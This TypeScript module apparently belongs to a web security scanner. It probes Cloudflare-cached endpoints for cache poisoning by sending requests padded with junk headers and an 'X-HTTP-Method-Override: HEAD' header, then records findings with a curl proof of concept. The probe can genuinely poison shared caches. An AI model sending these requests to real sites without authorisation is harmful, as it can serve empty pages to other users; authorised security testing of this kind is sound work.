import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { CdnFamily } from "../../core/cdn.js";

export async function sweepCfHeaderOverflow(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  cdn: CdnFamily | null
): Promise<Finding[]> {
  if (cdn !== "cloudflare") return [];
  const findings: Finding[] = [];
  const url = `https://${endpoint.host}${endpoint.path}`;
  for (const cap of [100, 50, 200]) {
    const padded: Record<string, string> = { ...baseline.headers };
    for (let i = 0; i < cap; i++) padded[`X-Junk-${i}`] = "a";
    padded["X-HTTP-Method-Override"] = "HEAD";
    const probe = await sender.send({ method: "GET", url, headers: padded, body: "" });
    const hit = /HIT/i.test(probe.response.headers["cf-cache-status"] ?? "");
    const empty = (probe.response.headers["content-length"] ?? "") === "0";
    if (hit && empty) {
      findings.push({
        id: `cp-${endpoint.id}-cf-overflow-${cap}`,
        module: "cache-poison",
        subtype: "cf-header-overflow",
        endpoint: `${endpoint.method} ${endpoint.path}`,
        primitive: { junk_count: cap, override: "X-HTTP-Method-Override: HEAD" },
        confidence: "high",
        evidence: { probe_id: probe.requestId, hit, content_length: "0" },
        poc_curl: `# pad with ${cap} junk headers, then\ncurl -H 'X-HTTP-Method-Override: HEAD' '${url}'`,
        wiki_ref: "wiki/techniques/server-side/cloudflare-cache-key-header-overflow.md"
      });
      break;
    }
  }
  return findings;
}
